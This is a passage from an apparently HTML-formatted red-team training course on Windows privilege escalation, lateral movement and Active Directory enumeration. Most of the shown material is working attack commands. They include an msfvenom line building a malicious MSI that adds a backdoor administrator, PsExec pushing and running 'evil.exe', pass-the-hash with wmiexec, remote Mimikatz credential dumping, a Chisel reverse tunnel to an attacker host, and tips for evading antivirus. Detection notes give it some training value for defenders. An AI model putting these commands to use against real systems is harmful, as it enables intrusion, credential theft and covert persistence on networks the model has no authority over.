class=\"language-cmd\"># Basic execution\nwinPEASany.exe\n\n# Output to file\nwinPEASany.exe &gt; winpeas_results.txt\n</code></pre>\n</li>\n<li><strong>Output:</strong> <code>WinPEAS</code> prints its findings to the console, often color-coded. It highlights potential vulnerabilities.</li>\n<li><strong>Teacher&#39;s Note:</strong> <code>WinPEAS</code> is often detected by AV/EDR. You might need to use obfuscated versions or run it from memory.</li>\n</ul>\n</li>\n<li><p><strong><code>Sherlock</code> (PowerShell):</strong> A PowerShell script focused on finding missing software patches that correspond to known kernel exploits. It compares the installed patches against a list of vulnerabilities.</p>\n<ul>\n<li><strong>Usage:</strong><ol>\n<li>Load the script: <code>Import-Module .\\Sherlock.ps1</code> or <code>. .\\Sherlock.ps1</code>.</li>\n<li>Run the check: <code>Find-AllVulns</code></li>\n</ol>\n</li>\n<li><strong>Output:</strong> Lists potential kernel vulnerabilities based on missing patches.</li>\n<li><strong>Teacher&#39;s Note:</strong> <code>Sherlock</code> only tells you <em>if</em> the system is vulnerable, not <em>how</em> to exploit it. You&#39;d then need to find a reliable exploit for the reported CVE.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Important Note on Automated Tools:</strong> These tools are <em>enumerators</em>. They <em>find</em> potential weaknesses. They don&#39;t always <em>exploit</em> them for you (though <code>PowerUp</code> has some exploitation functions). You still need to understand <em>why</em> the reported issue is a vulnerability and <em>how</em> to manually or semi-automatically exploit it. Relying solely on tools without understanding is a recipe for failure and getting caught.</p>\n<h3><strong>3.4 Case Study: AlwaysInstallElevated</strong></h3>\n<p>Let&#39;s look at a classic, simple PE vector: the <code>AlwaysInstallElevated</code> registry key.</p>\n<ul>\n<li><strong>The Vulnerability:</strong> Windows Installer (msiexec) can be configured via Group Policy or registry keys to install <code>.msi</code> packages with elevated privileges (SYSTEM) even if the user running the installer is not an administrator. This feature is intended for specific deployment scenarios but is a major security risk if enabled globally.</li>\n<li><strong>Identification:</strong> Check these two registry keys:<ul>\n<li><code>HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></li>\n<li><code>HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></li>\n<li>If <em>both</em> keys exist and are set to <code>1</code>, the vulnerability is present.</li>\n</ul>\n<pre><code class=\"language-powershell\"># Check HKCU\nGet-ItemProperty -Path &quot;HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer&quot; -Name &quot;AlwaysInstallElevated&quot; -ErrorAction SilentlyContinue\n\n# Check HKLM\nGet-ItemProperty -Path &quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer&quot; -Name &quot;AlwaysInstallElevated&quot; -ErrorAction SilentlyContinue\n</code></pre>\n<pre><code class=\"language-cmd\">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>\n</li>\n<li><strong>Exploitation:</strong><ol>\n<li>If both keys are <code>1</code>, you can create a malicious <code>.msi</code> package.</li>\n<li>Execute the <code>.msi</code> package using <code>msiexec</code>.</li>\n<li>Your code within the <code>.msi</code> package will execute with SYSTEM privileges.</li>\n</ol>\n<ul>\n<li><strong>Creating a Malicious MSI:</strong> This requires specific tools (like <code>msfvenom</code> or creating a custom WiX project). <code>msfvenom</code> is the simpler route for red teaming.<pre><code class=\"language-bash\"># Example using msfvenom to create an MSI that adds a user &#39;hacker&#39; with password &#39;Password123!&#39;\nmsfvenom -p windows/exec CMD=&#39;net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add&#39; -f msi -o evil.msi\n</code></pre>\n</li>\n<li><strong>Executing the MSI:</strong><pre><code class=\"language-cmd\">msiexec /quiet /qn /i C:\\Path\\To\\\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-4": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 4: module_4</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, fellow knowledge seekers! Let&#39;s dive deep into Module 4 of our journey: <strong>Lateral Movement Techniques</strong>. This is where we take that initial foothold and start exploring the network, turning one compromised machine into a launching pad for wider access.</p>\n<p>This module is absolutely critical. In most real-world scenarios, the initial access point isn&#39;t the ultimate target (like the Domain Controller or a critical database server). You <em>have</em> to move laterally to get there. Mastering these techniques is fundamental to successful red teaming and understanding how attackers propagate within a network.</p>\n<hr>\n<h3><strong>Module 4: Lateral Movement Techniques</strong></h3>\n<ul>\n<li><strong>Module Objective:</strong> Master various techniques to move from a compromised host to other systems within the network using harvested credentials, session reuse, and native tools.</li>\n</ul>\n<hr>\n<p>Welcome back! By now, you&#39;ve gained a foothold on a Windows machine (Module 1), enumerated valuable local info and credentials (Module 2), and potentially elevated your privileges to Administrator or SYSTEM on that host (Module 3). Fantastic work!</p>\n<p>But we&#39;re not stopping there. Our objective isn&#39;t just one machine; it&#39;s often the entire domain. To get there, we need to move from our current position to other machines on the network. This is the essence of <strong>Lateral Movement</strong>.</p>\n<p><strong>What is Lateral Movement?</strong></p>\n<p>Lateral movement refers to the techniques adversaries use to navigate to and control systems other than the initially compromised host. It&#39;s about expanding your access and reach within the target network. Think of it like moving through rooms in a building after you&#39;ve gotten through the front door.</p>\n<p><strong>Why is Lateral Movement Necessary?</strong></p>\n<ol>\n<li><strong>Reach High-Value Targets:</strong> Domain controllers, critical servers (databases, file shares, applications), and executive workstations often aren&#39;t directly accessible from the internet or the initial access point.</li>\n<li><strong>Gather More Information:</strong> Moving to different systems provides new perspectives, potentially revealing more sensitive data, additional users, group memberships, network diagrams, or credentials.</li>\n<li><strong>Find Better Credentials:</strong> Compromising more machines increases the chances of finding credentials for higher-privileged accounts, which are essential for achieving domain dominance.</li>\n<li><strong>Establish Persistence:</strong> Spreading access across multiple hosts makes it harder for defenders to evict you completely if they find and clean up one machine.</li>\n<li><strong>Access Specific Resources:</strong> You might need to reach a specific application server or file share to complete your objective.</li>\n</ol>\n<hr>\n<h4><strong>Essential Subtopics &amp; Deep Dive:</strong></h4>\n<h5><strong>4.1 Understanding Network Topology &amp; Trust Relationships</strong></h5>\n<p>Before you start moving, you need to know where you <em>can</em> move and where you <em>want</em> to move. This requires understanding the network layout and how systems are connected and trust each other.</p>\n<ul>\n<li><p><strong>Network Topology:</strong></p>\n<ul>\n<li>Are there different subnets?</li>\n<li>Are there firewalls between segments?</li>\n<li>What&#39;s the general layout (flat network, segmented, DMZ)?</li>\n<li>Identifying nearby hosts is a crucial first step. We touched on this in Module 1 (<code>ipconfig</code>, <code>netstat</code>). From a compromised host, you can also:<ul>\n<li>Check the local ARP cache (<code>arp -a</code>).</li>\n<li>Ping known hosts (like the default gateway, DNS servers found in <code>ipconfig</code>).</li>\n<li>Use tools like <code>nmap</code> (if available or uploaded) or native PowerShell/CMD methods to scan local subnets (<code>for /L %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i &amp; if errorlevel 0 echo 192.168.1.%i &gt;&gt; live_hosts.txt</code>).</li>\n<li>Look at network shares connected (<code>net use</code>).</li>\n<li>Examine DNS cache (<code>ipconfig /displaydns</code>).</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Trust Relationships (within a Windows Domain):</strong></p>\n<ul>\n<li>In a domain environment, machines trust the Domain Controller to authenticate users.</li>\n<li>Users authenticated on one domain-joined machine can often access resources on <em>other</em> domain-joined machines <em>if</em> they have the necessary permissions <em>and</em> the target machine trusts the authentication source.</li>\n<li>Understanding which users have administrative rights on which machines is key. Local Administrator groups on workstations often contain Domain Admins or specific privileged domain users.</li>\n<li>We&#39;ll dive much deeper into Active Directory structure and trusts in Module 5, but keep in mind <em>who</em> you are authenticated as and <em>where</em> that identity is trusted is paramount for lateral movement.</li>\n</ul>\n</li>\n</ul>\n<p><strong>How to find potential targets from the initial host (Native/PowerShell):</strong></p>\n<pre><code class=\"language-powershell\"># Find computers in the current domain (requires ActiveDirectory module or PowerView)\n# Using PowerView (often preferred in offensive scenarios)\n# Assuming PowerView is loaded (e.g., via Import-Module or dot-sourcing)\nGet-DomainComputer | Select-Object Name, OperatingSystem, LastLogonDate | Format-Table -AutoSize\n\n# Basic network scanning using Test-Connection (ping)\n# Replace 192.168.1.0/24 with the local subnet\n$subnet = &quot;192.168.1.&quot;\nfor ($i = 1; $i -le 254; $i++) {\n    $ip = $subnet + $i\n    if (Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue) {\n        Write-Host &quot;$ip is Online&quot;\n    }\n}\n\n# Check for open RDP ports (3389) on potential targets\n# Requires ability to make outbound connections\n$potentialTargets = @(&quot;192.168.1.10&quot;, &quot;192.168.1.11&quot;, &quot;ServerA.domain.local&quot;) # Example list\nforeach ($target in $potentialTargets) {\n    try {\n        $socket = New-Object System.Net.Sockets.TcpClient($target, 3389)\n        Write-Host &quot;$target has RDP port 3389 open&quot;\n        $socket.Close()\n    } catch {\n        # Port is likely closed or host is down\n    }\n}\n\n# Similarly, check for SMB (445), WinRM (5985/5986), RPC (135)\n</code></pre>\n<h5><strong>4.2 Leveraging Harvested Credentials for Lateral Movement</strong></h5>\n<p>This is the engine that drives most lateral movement within a Windows domain. The credentials you harvested in Module 2 (or will harvest later) are gold.</p>\n<ul>\n<li><p><strong>Types of Credentials:</strong></p>\n<ul>\n<li><strong>Plaintext Passwords:</strong> The most valuable. Can be used for any authentication method.</li>\n<li><strong>NTLM Hashes:</strong> Can be used directly for authentication via techniques like Pass-the-Hash (PtH) against services using NTLM authentication (like SMB).</li>\n<li><strong>Kerberos Tickets:</strong> Can be reused or forged via techniques like Pass-the-Ticket (PtT) or Overpass-the-Hash (OpH).</li>\n<li><strong>Cached Credentials:</strong> Stored by the OS.</li>\n<li><strong>Saved Credentials:</strong> Stored in Credential Manager or configuration files.</li>\n</ul>\n</li>\n<li><p><strong>How they enable LM:</strong> Many remote administration tools and protocols (PsExec, WMI, RDP, PowerShell Remoting, SMB) support authentication using usernames/passwords or hashes/tickets. If you have valid credentials for an account that has permissions on a target machine, you can use these tools to authenticate and execute code or access resources remotely.</p>\n</li>\n<li><p><strong>Note:</strong> We will have a <em>deep dive</em> into the specifics of NTLM, Kerberos, Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash in <strong>Module 6</strong>. For now, understand that having a user&#39;s password or hash <em>allows</em> you to use the techniques described below to authenticate to other machines <em>as that user</em>.</p>\n</li>\n</ul>\n<h5><strong>4.3 Lateral Movement using Native Windows Tools</strong></h5>\n<p>These techniques leverage built-in Windows features and protocols. They are powerful because they often don&#39;t require uploading custom binaries (though helper scripts or tools are common), can sometimes blend in with normal network traffic, and rely on functionality that is often enabled by default for legitimate administration.</p>\n<p>Let&#39;s break down the most common and effective ones:</p>\n<h6><strong>4.3.1 PsExec and its Variants</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> PsExec (part of Sysinternals, now Microsoft) allows you to execute processes on other systems. It&#39;s widely used by administrators, making its traffic potentially less suspicious than custom malware.</p>\n</li>\n<li><p><strong>How it Works:</strong> PsExec typically works by installing a temporary Windows Service (<code>PSEXESVC</code>) on the target machine. This service then executes the command you specify and sends the output back. It authenticates using the credentials of the user running PsExec or explicitly provided credentials.</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Simple to use.</li>\n<li>Requires no client-side installation on the target (except the temporary service).</li>\n<li>Effective for executing commands or launching shells remotely.</li>\n<li>Commonly used by IT, potentially blending in.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires administrative privileges on the target machine.</li>\n<li>Creates a service (<code>PSEXESVC</code>), which is a common detection artifact.</li>\n<li>Can be blocked by endpoint security solutions.</li>\n<li>Relies on SMB (ports 139/445) and RPC (port 135).</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Using current user&#39;s credentials (if admin on target):</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip_or_hostname&gt; &lt;command_to_execute&gt;\n# Example: Execute cmd.exe on Server01\nPsExec.exe \\\\Server01 cmd.exe\n# This will open an interactive command shell on Server01\n</code></pre>\n</li>\n<li><strong>Using explicit credentials:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip_or_hostname&gt; -u &lt;domain&gt;\\&lt;username&gt; -p &lt;password&gt; &lt;command_to_execute&gt;\n# Example: Execute whoami as domain\\administrator on 192.168.1.20\nPsExec.exe \\\\192.168.1.20 -u domain\\administrator -p &#39;MySecretPwd123!&#39; whoami\n</code></pre>\n</li>\n<li><strong>Running as SYSTEM:</strong> The <code>-s</code> flag runs the process in the SYSTEM account&#39;s security context. The <code>-h</code> flag (Windows Vista and later) runs the process with the account&#39;s elevated token, often bypassing UAC prompts on the target if the user is in the Administrators group.<pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -s cmd.exe\nPsExec.exe \\\\&lt;target_ip&gt; -h cmd.exe\n</code></pre>\n</li>\n<li><strong>Executing a program with arguments:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -u &lt;user&gt; -p &lt;pass&gt; &quot;C:\\Path\\To\\Program.exe&quot; arg1 arg2\n</code></pre>\n</li>\n<li><strong>Copying a file and executing it:</strong><pre><code class=\"language-cmd\">PsExec.exe \\\\&lt;target_ip&gt; -c &lt;local_file_to_copy&gt; &lt;command_to_execute_copied_file&gt;\n# Example: Copy evil.exe and run it\nPsExec.exe \\\\192.168.1.20 -u domain\\user -p pass -c evil.exe evil.exe\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for <code>PSEXESVC</code> service creation and deletion events (Event ID 7036 in System log), remote process creation events (Event ID 4688 with <code>PSEXESVC</code> as parent, or Sysmon Event ID 1), and network traffic patterns indicative of SMB/RPC service installation and command execution.</p>\n</li>\n</ul>\n<h6><strong>4.3.2 Windows Management Instrumentation (WMI)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> WMI is a powerful interface for managing Windows systems, both locally and remotely. It allows querying system information, executing methods (including creating processes), and receiving event notifications.</p>\n</li>\n<li><p><strong>How it Works:</strong> WMI uses DCOM (Distributed Component Object Model) over RPC (port 135) initially, then negotiates ports for the actual data transfer. It can also operate over WinRM (ports 5985/5986). It authenticates using standard Windows methods (NTLM/Kerberos).</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Native to Windows.</li>\n<li>Extremely flexible for both enumeration and execution.</li>\n<li>Often allowed by firewalls for management purposes.</li>\n<li>Less noisy than PsExec&#39;s service creation (though remote process creation is still detectable).</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Syntax can be complex (<code>wmic</code>, WMI Query Language - WQL).</li>\n<li>Requires administrative privileges on the target for most offensive actions (like process creation).</li>\n<li>Firewall rules might restrict DCOM/RPC traffic.</li>\n</ul>\n</li>\n<li><p><strong>Usage (PowerShell):</strong></p>\n<ul>\n<li><strong>Executing a command/process:</strong><pre><code class=\"language-powershell\"># Using Invoke-WmiMethod (newer PowerShell)\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c ipconfig &gt; C:\\temp\\ipconfig_target.txt&quot; -ComputerName &lt;target_ip_or_hostname&gt; -Credential (Get-Credential) # Prompts for credentials\n# Or pass credentials directly (less secure in scripts, better for interactive)\n$pass = ConvertTo-SecureString &#39;MySecretPwd123!&#39; -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential &#39;domain\\user&#39;, $pass\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c whoami &gt; C:\\temp\\whoami_target.txt&quot; -ComputerName &lt;target_ip&gt; -Credential $cred\n\n# Using Get-WmiObject (older PowerShell)\n(Get-WmiObject win32_process -computername &lt;target_ip&gt; -credential $cred).create(&quot;cmd /c calc.exe&quot;)\n</code></pre>\n</li>\n<li><strong>Enumeration (useful for recon from a distance):</strong><pre><code class=\"language-powershell\">Get-WmiObject -Class Win32_OperatingSystem -ComputerName &lt;target_ip&gt; -Credential $cred\nGet-WmiObject -Class Win32_Service -ComputerName &lt;target_ip&gt; -Credential $cred | Where-Object {$_.StartMode -eq &#39;Auto&#39;}\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Usage (wmic command - from CMD):</strong></p>\n<ul>\n<li><strong>Executing a process:</strong><pre><code class=\"language-cmd\">wmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; process call create &quot;cmd.exe /c whoami &gt; C:\\temp\\whoami_target_wmic.txt&quot;\n</code></pre>\n</li>\n<li><strong>Enumeration:</strong><pre><code class=\"language-cmd\">wmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; os get Caption,CSDVersion,OSArchitecture /format:list\nwmic /node:&lt;target_ip&gt; /user:&quot;&lt;domain&gt;\\&lt;user&gt;&quot; /password:&quot;&lt;password&gt;&quot; service get Name,State /format:list\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Usage (Impacket&#39;s <code>wmiexec.py</code>):</strong> A popular Python tool for WMI execution, often used from Linux/Kali.</p>\n<pre><code class=\"language-bash\"># Using password\nwmiexec.py &lt;domain&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target_ip&gt; &#39;whoami&#39;\n# Using NTLM hash (requires hash obtained previously)\nwmiexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -hashes :&lt;ntlm_hash&gt; &#39;ipconfig&#39;\n</code></pre>\n</li>\n<li><p><strong>Detection:</strong> Look for remote WMI activity (often logged on the target, Sysmon Event ID 21 for WMI event consumers, Event ID 4624/4625 for remote logins, remote process creation Event ID 4688/Sysmon ID 1 initiated by WMI processes like <code>WmiPrvse.exe</code>).</p>\n</li>\n</ul>\n<h6><strong>4.3.3 Remote Desktop Protocol (RDP)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> RDP provides a graphical interface to a remote machine. If RDP is enabled and you have credentials for a user allowed to log in via RDP (typically users in the Remote Desktop Users group or Administrators), you can establish a full interactive session.</p>\n</li>\n<li><p><strong>How it Works:</strong> RDP uses port 3389 (default) and establishes a direct graphical session. Authentication uses standard Windows methods.</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Full interactive access.</li>\n<li>Easy to navigate and use the target system.</li>\n<li>Commonly used by administrators.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires RDP service to be enabled on the target.</li>\n<li>Requires credentials for a user permitted to RDP.</li>\n<li>Creates an interactive logon session, which is highly visible in logs (Event ID 4624 Logon Type 10).</li>\n<li>Firewalls might block port 3389.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Native RDP Client (mstsc.exe):</strong><pre><code class=\"language-cmd\">mstsc /v:&lt;target_ip_or_hostname&gt;\n# You will be prompted for credentials.\n# To pre-fill username (password still prompted):\nmstsc /v:&lt;target_ip&gt; /u:&lt;domain&gt;\\&lt;user&gt;\n</code></pre>\n</li>\n<li><strong>Using saved RDP credentials:</strong> If the user on your current host has saved RDP credentials for the target, <code>mstsc</code> might use them automatically.</li>\n<li><strong>Tools that automate RDP login:</strong> Some C2 frameworks or specialized tools can automate RDP logins using harvested credentials.</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for interactive logon events (Event ID 4624 Logon Type 10) on the target machine, RDP session connect/disconnect events, and network traffic on port 3389.</p>\n</li>\n</ul>\n<h6><strong>4.3.4 PowerShell Remoting (PSRemoting)</strong></h6>\n<ul>\n<li><p><strong>Concept:</strong> PSRemoting allows executing PowerShell commands and scripts on remote computers. It&#39;s the preferred method for remote administration in modern Windows environments.</p>\n</li>\n<li><p><strong>How it Works:</strong> PSRemoting uses the WS-Management protocol (WinRM listener) typically over HTTP (port 5985) or HTTPS (port 5986). It uses standard Windows authentication. It needs to be enabled on the target machine (<code>Enable-PSRemoting</code>).</p>\n</li>\n<li><p><strong>Pros:</strong></p>\n<ul>\n<li>Powerful and flexible for complex tasks and scripting.</li>\n<li>Native to PowerShell, integrates well with other cmdlets.</li>\n<li>Can be more firewall-friendly than DCOM/RPC depending on configuration.</li>\n<li>Often enabled in modern server environments.</li>\n</ul>\n</li>\n<li><p><strong>Cons:</strong></p>\n<ul>\n<li>Requires PSRemoting to be enabled on the target.</li>\n<li>Requires credentials for a user with remote execution rights (often Administrators).</li>\n<li>Firewalls might block ports 5985/5986.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li><strong>Entering an interactive session:</strong><pre><code class=\"language-powershell\">Enter-PSSession -ComputerName &lt;target_ip_or_hostname&gt; -Credential (Get-Credential) # Prompts\n# Using explicit credentials:\n$pass = ConvertTo-SecureString &#39;MySecretPwd123!&#39; -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential &#39;domain\\user&#39;, $pass\nEnter-PSSession -ComputerName &lt;target_ip&gt; -Credential $cred\n# Once inside the session, the prompt changes, e.g., [target_ip]: PS&gt;\n# You can run PowerShell commands directly on the target. Type &#39;Exit-PSSession&#39; to leave.\n</code></pre>\n</li>\n<li><strong>Running a single command or script block:</strong><pre><code class=\"language-powershell\">Invoke-Command -ComputerName &lt;target_ip&gt; -ScriptBlock { &lt;command_to_execute&gt; } -Credential $cred\n# Example:\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Get-Process explorer } -Credential $cred\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { ipconfig /all &gt; C:\\temp\\ipconfig_psremoting.txt } -Credential $cred\n</code></pre>\n</li>\n<li><strong>Using PowerShell scripts/modules remotely:</strong> Many post-exploitation frameworks and scripts (like PowerSploit&#39;s <code>PowerView</code> or <code>Invoke-Mimikatz</code>) are designed to be run via <code>Invoke-Command</code> or within a remote session.<pre><code class=\"language-powershell\"># Example: Run Invoke-Mimikatz remotely (assuming it&#39;s loaded in the remote session or dot-sourced)\nInvoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Invoke-Mimikatz -Command &#39;&quot;sekurlsa::logonpasswords&quot;&#39; } -Credential $cred\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p><strong>Detection:</strong> Look for WinRM activity (Event ID 4624/4625 for network logins, Event ID 4100/4104 for PowerShell script block logging, Event ID 4688/Sysmon ID 1 for remote process creation initiated via WinRM, network traffic on ports 5985/5986).</p>\n</li>\n</ul>\n<h5><strong>4.4 Session Reuse and Leveraging Existing Authenticated Sessions</strong></h5>\n<ul>\n<li><p><strong>Concept:</strong> Sometimes, you don&#39;t need to explicitly provide credentials for a lateral move. If the user you are currently acting as on the compromised host already has an authenticated session or cached credentials that are valid on the target machine, you might be able to leverage that existing context.</p>\n</li>\n<li><p><strong>How it Works:</strong> When a user authenticates to a domain resource (like a file share, a web server, etc.), the Windows LSA (Local Security Authority) caches credentials or obtains Kerberos tickets. Subsequent attempts to access <em>other</em> resources <em>as the same user</em> might automatically use these cached credentials or tickets without prompting for a password again.</p>\n</li>\n<li><p><strong>Practical Application:</strong></p>\n<ul>\n<li>If you compromise a machine where a Domain Admin is currently logged in, you might be able to use tools that operate in the context of the <em>logged-in user&#39;s</em> session to access other resources they have permissions for.</li>\n<li>Tools like <code>runas /netonly</code> can simulate logging in as a different user specifically for network resource access <em>without</em> changing the current user on the local machine. This is useful if you have credentials but don&#39;t want to PE on the current machine yet or can&#39;t inject into a process.<pre><code class=\"language-cmd\"># Example: Run cmd.exe as domain\\admin, but only for network access\nrunas /netonly /user:domain\\admin cmd.exe\n# A new CMD window opens. Inside this window, try accessing a share only admin can access:\n# net use \\\\&lt;target_ip&gt;\\C$\n# dir \\\\&lt;target_ip&gt;\\C$\n</code></pre>\n</li>\n<li>Leveraging Kerberos ticket caches (covered more in M6 with Pass-the-Ticket). If you can extract a user&#39;s TGT (Ticket Granting Ticket), you can inject it into a session on <em>another</em> machine and potentially access resources as that user.</li>\n</ul>\n</li>\n<li><p><strong>OpSec Note:</strong> Using <code>runas /netonly</code> or similar techniques might still generate logon events on the target resource, but the logon type might be different (e.g., Network cleartext, Logon Type 3) compared to an interactive RDP logon (Logon Type 10).</p>\n</li>\n</ul>\n<h5><strong>4.5 Pivoting and Tunneling</strong></h5>\n<ul>\n<li><p><strong>Concept:</strong> Pivoting (or relaying) and tunneling are techniques used to route network traffic through a compromised host to reach other systems or networks that are not directly accessible from the attacker&#39;s machine.</p>\n</li>\n<li><p><strong>How it Works:</strong></p>\n<ul>\n<li><strong>Pivoting:</strong> The compromised host acts as a relay. Attack traffic is sent to the compromised host, which then forwards it to the intended target deeper in the network. Tools like Metasploit&#39;s <code>autoroute</code> or <code>socks4a</code> modules, or frameworks like Covenant, have built-in pivoting capabilities.</li>\n<li><strong>Tunneling:</strong> Creates a secure channel (like an SSH tunnel, or tunnels created by tools like Chisel, Earthworm, etc.) through the compromised host. Traffic is encapsulated and sent through this tunnel. This can be used to access specific ports or even entire networks.</li>\n</ul>\n</li>\n<li><p><strong>Why use it?</strong></p>\n<ul>\n<li>To bypass network segmentation and firewalls.</li>\n<li>To access systems on isolated subnets.</li>\n<li>To obscure the true origin of the attack traffic.</li>\n</ul>\n</li>\n<li><p><strong>Usage:</strong></p>\n<ul>\n<li>This is often integrated into C2 frameworks.</li>\n<li>Manual methods involve setting up port forwards or SOCKS proxies on the compromised host.</li>\n<li><strong>Example (using Chisel):</strong><ul>\n<li>Run Chisel server on attacker machine: <code>chisel server -p 8000 --socks5</code></li>\n<li>Upload Chisel client to compromised host.</li>\n<li>Run Chisel client on compromised host: <code>chisel client &lt;attacker_ip&gt;:8000 R:socks5</code></li>\n<li>Now, configure tools on attacker machine to use a SOCKS5 proxy pointing to <code>localhost:1080</code> (or whatever the client forwarded), and their traffic will be routed through the compromised host.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Note:</strong> Full network pivoting and tunneling is a complex topic often covered in more advanced modules or specialized courses. For the scope of this course on AD red teaming, understand the <em>concept</em> that if a target isn&#39;t directly reachable, a compromised host <em>within</em> that network can act as a stepping stone. We will focus primarily on the <em>techniques for execution once you <em>can</em> reach the target host</em> using credentials.</p>\n</li>\n</ul>\n<h5><strong>4.6 OpSec Considerations for Lateral Movement</strong></h5>\n<p>Lateral movement is inherently noisy compared to initial reconnaissance on a single host. You are interacting with multiple systems across the network, generating logs and network traffic.</p>\n<ul>\n<li><strong>What Defenders See:</strong><ul>\n<li><strong>Authentication Logs:</strong> Successful and failed login attempts on target machines (Event ID 4624/4625). Logon Type 3 (Network) is common for PsExec, WMI, SMB access. Logon Type 10 (RemoteInteractive) for RDP.</li>\n<li><strong>Process Creation Logs:</strong> Remote execution techniques like PsExec, WMI, and PSRemoting result in new processes being created on the target machine (Event ID 4688, Sysmon Event ID 1). Look for unusual parent-child relationships (e.g., <code>wmiprvse.exe</code> or <code>PSEXESVC.exe</code> launching <code>cmd.exe</code> or <code>powershell.exe</code>).</li>\n<li><strong>Service Creation Logs:</strong> PsExec creates the <code>PSEXESVC</code> service (Event ID 7036).</li>\n<li><strong>Network Traffic:</strong> Specific ports being accessed (135, 139, 44</li>\n</ul>\n</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-5": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 5: module_5</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve spent the last few modules getting cozy on a single Windows host, digging through its secrets, and figuring out how to become its local king or queen. But let&#39;s be real ‚Äì the real treasure in most corporate environments isn&#39;t just on one machine; it&#39;s spread across the domain. And the keys to the kingdom? They usually reside in Active Directory.</p>\n<p>This is where the game changes. We&#39;re moving from a single-player scenario to understanding the entire network ecosystem. Module 5 is all about becoming master cartographers of the Active Directory forest, mapping out the paths that lead to the most valuable targets. This isn&#39;t just about running a few commands; it&#39;s about building a comprehensive picture of the domain&#39;s structure, users, groups, computers, and critically, the <em>relationships</em> between them.</p>\n<p>Think of AD enumeration as gathering intelligence, and attack path mapping as turning that intelligence into a strategic plan. Without this step, you&#39;re just blindly poking around. With it, you&#39;re efficiently identifying the weakest links and the most direct routes to your objectives.</p>\n<p>Let&#39;s dive in and learn how to see the forest <em>and</em> the trees!</p>\n<hr>\n<h2><strong>Module 5: Active Directory Enumeration &amp; Attack Path Mapping</strong></h2>\n<p><strong>Module Objective:</strong> Conduct comprehensive reconnaissance of an Active Directory environment to identify users, groups, computers, trusts, GPOs, and map potential attack paths to high-value targets like Domain Admins. By the end of this module, you&#39;ll be able to use native tools, PowerShell, and BloodHound to understand the structure and relationships within an AD domain and identify promising attack vectors.</p>\n<p><strong>Target State:</strong> From a compromised domain-joined host (simulating initial access from previous modules), you can enumerate key AD objects and their relationships, load this data into a graph database tool, and query it to find potential attack paths towards sensitive targets.</p>\n<hr>\n<h3><strong>5.1 Introduction to Active Directory Concepts (Refresher)</strong></h3>\n<p>Before we start poking around, let&#39;s quickly ground ourselves in the fundamentals. Even if you&#39;ve worked with AD before, a red teamer&#39;s perspective is slightly different ‚Äì we care about how these components create potential security weaknesses.</p>\n<ul>\n<li><strong>Domain Controller (DC):</strong> The heart of the domain. Holds the Active Directory database (NTDS.DIT), authenticates users, enforces security policies. Compromising a DC often means domain dominance.</li>\n<li><strong>Forest:</strong> A collection of one or more domains that share a common schema, configuration, and global catalog. Domains within a 